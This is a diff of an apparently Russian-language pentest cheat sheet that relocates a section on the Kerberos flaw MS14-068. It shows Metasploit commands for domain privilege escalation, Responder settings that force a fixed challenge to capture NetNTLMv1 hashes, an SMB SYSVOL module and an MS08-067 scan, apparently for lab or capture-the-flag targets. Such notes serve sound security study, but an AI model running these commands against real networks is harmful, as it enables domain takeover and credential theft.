@@ -1806,16 +1806,7 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 		set SMBSHARE SYSVOL  # Можно изменить на другой ресурс, например, Replication
 		run
 		
-# Уязвимость MS14-068 (CVE-2014-6324) (CVE-2014-6324 (MS14-068) — это критическая уязвимость в протоколе Kerberos в Microsoft Windows, которая позволяет повысить привилегии обычного пользователя домена до уровня доменного администратора. Уязвимость существует в реализации проверки подписи PAC (Privilege Attribute Certificate) в билетах Kerberos)
 
-	use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
-	set RHOST <DC_IP>
-	set USERNAME <user>
-	set PASSWORD <password>
-	set DOMAIN <domain.com>
-	run
-
-	systeminfo | find "KB3011780" (проверить обновление)
 
 
 	
@@ -1929,6 +1920,17 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 		sudo sed -i 's/ Challenge = Random/ Challenge = 1122334455667788/g' /usr/share/responder/Responder.conf
 		sudo responder -I eth0 --lm --disable-ess -v
 		https://ntlmv1.com/login.php (сайт который переводит netntlmv1 в NTLM hash)
+
+# Уязвимость MS14-068 (CVE-2014-6324) (CVE-2014-6324 (MS14-068) — это критическая уязвимость в протоколе Kerberos в Microsoft Windows, которая позволяет повысить привилегии обычного пользователя домена до уровня доменного администратора. Уязвимость существует в реализации проверки подписи PAC (Privilege Attribute Certificate) в билетах Kerberos)
+
+	use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
+	set RHOST <DC_IP>
+	set USERNAME <user>
+	set PASSWORD <password>
+	set DOMAIN <domain.com>
+	run
+
+	systeminfo | find "KB3011780" (проверить обновление)
 
 # Уязвимость MS08-067
 	nmap --script smb-vuln-ms08-067 -p445 <целевой IP-адрес>		(но может завалить систему)
